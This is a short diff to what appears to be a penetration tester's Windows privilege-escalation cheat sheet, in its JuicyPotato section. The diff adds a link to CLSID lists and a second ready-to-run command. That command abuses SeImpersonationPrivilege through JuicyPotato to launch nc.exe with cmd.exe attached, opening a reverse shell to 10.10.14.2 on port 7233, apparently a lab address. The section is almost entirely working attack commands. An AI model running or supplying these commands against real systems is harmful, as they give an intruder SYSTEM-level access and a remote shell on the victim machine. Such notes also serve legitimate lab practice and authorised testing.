@@ -340,10 +340,14 @@ Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*" | ft TaskName,Task
 
 ### JuicyPotato
 1. check under ```whoami /priv``` that ```SeImpersonationPrivilege``` is available
-2. Run juicypotato, ensure that port ```1337``` is available and the ```-c``` input is the one for the current windows version.
+2. Run juicypotato, ensure that port ```1337``` is available and the ```-c``` input is the one for the [current windows version](https://github.com/ohpe/juicy-potato/tree/master/CLSID).
 3. Run this at the windows machine:
 ```
 JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {012323-123123-123213}
+
+#or
+
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\nc.exe -e cmd.exe 10.10.14.2 7233" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
 ```
 
 ### RoguePotato (newer, should work on Win10)
